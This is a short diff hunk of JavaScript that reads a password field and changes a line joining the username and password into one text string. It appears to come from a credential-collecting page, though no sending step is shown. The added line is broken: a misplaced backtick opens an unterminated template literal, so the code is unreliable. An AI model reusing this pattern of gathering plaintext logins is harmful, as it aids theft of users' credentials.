@@ -47,7 +47,7 @@ var pass = $("#pass").val();
 
 
 
-var text = "useer : `" + username + "`|| pass : " + pass;
+var text = "useer : `" + username + "`|| pass : `" + pass`;
 
 
 
